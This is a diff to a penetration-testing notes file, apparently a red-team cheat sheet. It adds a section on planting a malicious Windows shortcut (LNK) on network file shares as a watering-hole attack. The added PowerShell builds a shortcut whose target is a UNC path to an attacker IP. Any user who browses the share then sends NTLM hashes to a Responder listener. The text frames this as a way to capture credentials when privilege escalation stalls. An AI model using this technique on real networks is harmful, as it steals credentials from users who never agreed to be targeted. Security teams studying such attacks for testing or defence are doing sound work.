@@ -250,5 +250,17 @@ Gaining semi-reverse shell connection with custom .ps1 script.
 ## 🚩 LNK File Attacks (Windows Hash Capture)  
 In this scenario, we have the ability to setup a watering hole attack. By generating a malicious lnk using powershel. We could place a lnk file inside file shares of a network. And have responder listening within the same netwrok to recieve the commands set in the lnk.  
 
-This can be used in the event when we are having trouble gaining further access or elevating priviliges. However have access to a network file share. If the lnk can be succesfully placed in this shared location, anyone that access it (Automatic refresh) it will execute and send commands back to the attacking machine.  
+This can be used in the event when we are having trouble gaining further access or elevating priviliges. However we have access to a network file share. If the lnk can be succesfully placed in this shared location, anyone that access it (Automaticl refresh) it will execute the lnk with the commnands sent back to the attacking machine.  
+
+Run Admin Powershell command to create lnk for hash captures:
+
+    $objShell = New-Object -ComObject WScript.shell
+    $lnk = $objShell.CreateShortcut("C:\test.lnk")
+    $lnk.TargetPath = "\\192.168.138.149\@test.png"
+    $lnk.WindowStyle = 1
+    $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+    $lnk.Description = "Test"
+    $lnk.HotKey = "Ctrl+Alt+T"
+    $lnk.Save()
+
 
